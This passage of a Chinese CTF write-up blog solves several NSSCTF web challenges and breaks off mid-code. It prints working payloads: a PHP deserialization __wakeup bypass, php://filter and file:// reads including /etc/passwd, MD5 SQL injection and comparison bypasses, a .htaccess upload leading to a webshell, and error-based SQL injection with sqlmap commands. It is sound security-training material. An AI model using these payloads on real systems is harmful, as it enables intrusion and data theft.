向参数传入</p>\n<blockquote>\n<p>phpinfo();</p>\n</blockquote>\n<p>最终在环境变量中找到 flag，或者在蚁剑中打开终端（右键），输入 php -i 命令。</p>\n<p><strong>Content-Type 中常见的媒体格式类型：</strong></p>\n<p><strong>以 text 开头的媒体格式类型：</strong></p>\n<ul>\n<li>text/html： HTML 格式。</li>\n<li>text/plain：纯文本格式。</li>\n<li>text/xml： XML 格式。</li>\n</ul>\n<p><strong>以 image 开头的媒体格式类型：</strong></p>\n<ul>\n<li>image/gif：gif 图片格式。</li>\n<li>image/jpeg：jpg 图片格式。</li>\n<li>image/png：png 图片格式。</li>\n</ul>\n<p><strong>以 application 开头的媒体格式类型：</strong></p>\n<ul>\n<li>application/xhtml+xml：XHTML 格式。</li>\n<li>application/xml： XML 数据格式。</li>\n<li>application/atom+xml：Atom XML 聚合格式 。</li>\n<li>application/json： JSON 数据格式。</li>\n<li>application/pdf：pdf 格式 。</li>\n<li>application/msword： Word 文档格式。</li>\n<li>application/octet-stream： 二进制流数据（如常见的文件下载）。</li>\n<li>application/x-www-form-urlencoded： 中默认的 encType，form 表单数据被编码为 key/value 格式发送到服务器（表单默认的提交数据的格式）。</li>\n</ul>\n<p><strong>另外还有一种常见的媒体格式是上传文件之时使用的：</strong></p>\n<ul>\n<li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式。</li>\n</ul>\n<p>以上就是我们在日常的开发中，经常会用到的若干 Content-Type 的内容格式。</p>\n<h3 id=\"swpuctf-2021-新生赛no_wakeup\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛no_wakeup\">#</a> [SWPUCTF 2021 新生赛] no_wakeup</h3>\n<h4 id=\"php反序列化wakeup函数绕过\"><a class=\"anchor\" href=\"#php反序列化wakeup函数绕过\">#</a> php，反序列化，wakeup 函数绕过</h4>\n<p>打开后是一道熟悉的代码审计：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"class.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">HaHaHa</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123456\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"wllm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"No wake up\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$Letmeseesee</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Letmeseesee</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>与<strong> ez_unserialize</strong> 类似，但多出来一个____wakeup () 函数，php 在执行 unserialize () 函数前，会执行这个函数</p>\n<p>所以会将密码进行 sha1 加密，而 sha1 是不可逆加密算法，目前也没有合适的 sha1 碰撞方式，从函数上考虑绕过有些困难，故考虑绕过__wakeup () 函数。</p>\n<p>绕过的方法也很简单，只需要将序列化字符串表示对象属性个数的值大于真实的属性个数时，由于与反序列化的规则不符，就会反序列化失败，因此不会执行__wakeup ()，但是__destruct () 仍然可以执行。</p>\n<p><strong>注：</strong><br />\n或许你会疑惑：<br />\n<strong>明明无法完成反序列化，为什么还可以触发__destruct ()，为什么还能够对属性赋值？</strong></p>\n<p>你可以这样理解：<br />\n反序列化是一个正向检索的函数，虽然对于整体来说，数量不符，无法完成反序列化，但是可以尽可能检索能够完成反序列化的目标，所以这里数量改为了 3，会先依次反序列化 2 个单位，直到无法检索到第 3 个目标才判定反序列化失败。<br />\n所以当然可以触发__destruct (), 完成前面属性的赋值。</p>\n<p>在<strong> ez_unserialize</strong> 的 payload 稍做修改：</p>\n<blockquote s:5:admin;s:5:admin;s:6:passwd;s:4:wllm;=\"\">\n<p>?p=O:6:&quot;HaHaHa&quot;:3:</p>\n</blockquote>\n<p>得到 flag。</p>\n<h2 id=\"202398\"><a class=\"anchor\" href=\"#202398\">#</a> 2023/9/8</h2>\n<h3 id=\"swpuctf-2021-新生赛pseudoprotocols\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛pseudoprotocols\">#</a> [SWPUCTF 2021 新生赛] PseudoProtocols</h3>\n<h4 id=\"php伪协议文件包含\"><a class=\"anchor\" href=\"#php伪协议文件包含\">#</a> PHP 伪协议，文件包含</h4>\n<blockquote>\n<p>hint is hear Can you find out the hint.php?</p>\n</blockquote>\n<p>进去后提示我们查看 hint.php，用 php 伪协议查看：</p>\n<blockquote>\n<p>?wllm=php://filter/convert.base64-encode/resource=hint.php</p>\n</blockquote>\n<p>解码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//go to /test2222222222222.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 /test2222222222222.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"max_execution_time\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"180\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'I want flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"success\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>用 data 协议写入即可。</p>\n<h3 id=\"nisactf-2022easyssrf\"><a class=\"anchor\" href=\"#nisactf-2022easyssrf\">#</a> [NISACTF 2022]easyssrf</h3>\n<h4 id=\"php伪协议ssrf目录穿越\"><a class=\"anchor\" href=\"#php伪协议ssrf目录穿越\">#</a> php 伪协议，ssrf, 目录穿越</h4>\n<p>进去后有个让我们 curl 的框，随便输入一个百度官网，发现可以回显。</p>\n<p>输入：</p>\n<blockquote>\n<p>file:///etc/passwd</p>\n</blockquote>\n<p>返回：</p>\n<blockquote>\n<p>害羞羞，试试其他路径？</p>\n</blockquote>\n<p>可以判断出 file 协议可以用但是读取不了这个文件。</p>\n<p>尝试有没有 flag 文件：</p>\n<blockquote>\n<p>file:///flag</p>\n</blockquote>\n<p>返回：</p>\n<blockquote>\n<p>都说了这里看不了 flag。。但是可以看看提示文件：/fl4g</p>\n</blockquote>\n<p>输入：</p>\n<blockquote>\n<p>file:///fl4g</p>\n</blockquote>\n<p>返回：</p>\n<blockquote>\n<p>你应该看看除了 index.php，是不是还有个 ha1x1ux1u.php</p>\n</blockquote>\n<p>访问这个文件，代码如下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"你败了.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//flag in /flag</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>过滤了 file 协议，不过提示 flag 在 /flag 中，直接</p>\n<blockquote>\n<p>?file=/flag</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"bjdctf-2020easy_md5\"><a class=\"anchor\" href=\"#bjdctf-2020easy_md5\">#</a> [BJDCTF 2020]easy_md5</h3>\n<h4 id=\"数组绕过php代码审计弱比较md5绕过\"><a class=\"anchor\" href=\"#数组绕过php代码审计弱比较md5绕过\">#</a> 数组绕过，PHP 代码审计，弱比较，md5 绕过</h4>\n<p>打开后是个输入框，尝试进行 SQL 注入，注入了半天没啥用。</p>\n<p>换个思路，抓个包看看响应包里面有没有什么有用的信息。</p>\n<p>得到一串代码：</p>\n<blockquote>\n<p>hint: select * from 'admin' where password=md5($pass,true)</p>\n</blockquote>\n<p>这句话可以用下面这个绕过：</p>\n<p>MD5-SQL 注入</p>\n<blockquote>\n<p>ffifdyop 的 MD5 加密结果是 276f722736c95d99e921722cf9ed621c</p>\n<p>经过 MySQL 编码后会变成 'or'6xxx, 使 SQL 恒成立，相当于万能密码，可以绕过 md5 () 函数的加密</p>\n</blockquote>\n<p>该字符串 md5 加密后若 raw 参数为 True 时会返回 'or’6 (其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为 True，后面的会在 MySQL 将其转换成整型比较时丢掉)</p>\n<p>在 mysql 里面，在用作布尔型判断时，以非 0 数字开头的字符串会被当做整型数。</p>\n<p>相当于 password=‘xxx’ or 1</p>\n<p>进入下一阶段：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: levell14.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>这里有两种思路，一种就是 0e 绕过，另一种就是数组绕过。</p>\n<p>常用的 MD5 加密后以 0E 开头的有</p>\n<blockquote>\n<p>QNKCDZO<br />\n240610708<br />\nbyGcY<br />\nsonZ7y<br />\naabg7XSs<br />\naabC9RqS<br />\ns878926199a<br />\ns155964671a<br />\ns214587387a<br />\ns1091221200a</p>\n</blockquote>\n<p>数组绕过</p>\n<blockquote>\n<p>md5 不能加密数组，传入数组会报错，但会继续执行并且返回结果为 null</p>\n</blockquote>\n<p>这里我们用数组绕过：</p>\n<blockquote>\n<p>?a[]=1&amp;b[]=2</p>\n</blockquote>\n<p>进入最后阶段：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里是 md5 的强类型比较，0e 绕过就失去了效果，但数组绕过依然有效，</p>\n<blockquote>\n<p>param1[]=1&amp;param2[]=2</p>\n</blockquote>\n<p>或者可以尝试 md5 碰撞，这里就不尝试了。</p>\n<h2 id=\"2023910\"><a class=\"anchor\" href=\"#2023910\">#</a> 2023/9/10</h2>\n<h3 id=\"swpuctf-2021-新生赛easyupload30\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛easyupload30\">#</a> [SWPUCTF 2021 新生赛] easyupload3.0</h3>\n<h4 id=\"htaccess文件上传\"><a class=\"anchor\" href=\"#htaccess文件上传\">#</a> .htaccess, 文件上传</h4>\n<p>打开题目后，有个传文件的框 ，查看网页源代码，可以看到有串提示：</p>\n<blockquote>\n<p>试试和某些文件配合哦～</p>\n</blockquote>\n<p>.htaccess 文件</p>\n<blockquote>\n<p>htaccess 在站点的根目录下面，不是在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1hcGFjaGUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\"> apache</span> 目录下，但是它属于 apache 的一个配置文件</p>\n</blockquote>\n<p>taccess 文件时 Apache 服务中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向、自定义 404 错误页面，改变文件扩展名、允许 / 阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p>\n<p>其中.htaccess 文件内容：SetHandler application/x-http-php 的意思是设置当前目录所有文件都使用 php 解析，那么无论上传任何文件，只要符合 php 语言代码规范，就会被当做 PHP 执行。不符合规则则报错</p>\n<p>http.conf 文件 (前提条件)</p>\n<p>在此文件中设置 AllowOverried All ，才能使用.htaccess 文件</p>\n<p>值得一提的是.htaccess 只对<strong>该文件所在的目录</strong>下的文件起作用。</p>\n<p>这题目看到使用的是 apach 服务器，自然想到了.htaccess 文件，因此尝试上传</p>\n<blockquote>\n<p>AddType application/x-httpd-php .php .jpg .png .gif<br />\nSetHandler application/x-httpd-php</p>\n</blockquote>\n<p>成功上传后，再上传图片后缀的一句话木马，最后与蚁剑连接即可获得 flag。</p>\n<h3 id=\"swpuctf-2021-新生赛error\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛error\">#</a> [SWPUCTF 2021 新生赛] error</h3>\n<h4 id=\"报错注入sql注入\"><a class=\"anchor\" href=\"#报错注入sql注入\">#</a> 报错注入，SQL 注入</h4>\n<p>很基础的报错注入，需要稍微注意的是最后得用字符串截取函数显现完整的 flag。</p>\n<blockquote>\n<p>爆出数据库名字 -1'and (select extractvalue (1,concat ('~',(select database ()))))#\t报错注入</p>\n</blockquote>\n<blockquote>\n<p>爆出所有数据库名 -1'and (select extractvalue (1,concat ('~',(select group_concat (schema_name) from information_schema.schemata))))#</p>\n</blockquote>\n<blockquote>\n<p>爆出数据库 test_db 下所有的表 -1'and (select extractvalue (1,concat ('~',(select group_concat (table_name) from information_schema.tables where table_schema='test_db'))))#</p>\n</blockquote>\n<blockquote>\n<p>爆出 test_db 数据库下 test_tb 表所有的列名 -1'and (select extractvalue (1,concat ('~',(select group_concat (column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema='test_db'))))#</p>\n</blockquote>\n<blockquote>\n<p>查询 flag -1'and (select extractvalue (1,concat ('~',(select substr ((select flag from test_tb), 1 , 31)))))#  0-30 位 左边 30 位  -1'and (select extractvalue (1,concat ('~',(select substr ((select flag from test_tb), 31 , 60)))))#  31-60 位 右边边 31 位</p>\n</blockquote>\n<p>或者还可以用 sqlmap 去做：</p>\n<blockquote>\n<p>sqlmap -u <span class=\"exturl\" data-url=\"aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x\">http://node1.anna.nssctf.cn:28894/?id=1</span> --dbs // 得到库名</p>\n<p>sqlmap -u <span class=\"exturl\" data-url=\"aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x\">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db --tables // 得到表名</p>\n<p>sqlmap -u <span class=\"exturl\" data-url=\"aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x\">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db -T test_tb --columns // 得到列名</p>\n<p>sqlmap -u <span class=\"exturl\" data-url=\"aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x\">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db -T test_tb -C flag --dump // 输出 FLAG</p>\n</blockquote>\n<h3 id=\"swpuctf-2021-新生赛hardrce\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛hardrce\">#</a> [SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"waf绕过无字母rce\"><a class=\"anchor\" href=\"#waf绕过无字母rce\">#</a> waf 绕过，无字母 rce</h4>\n<p>做此题前可以先看看一下文档</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA0NjMxMTQy\">php 代码执行的各种绕过姿势</span></p>\n<p>进入题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wllm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$wllm</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wllm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token 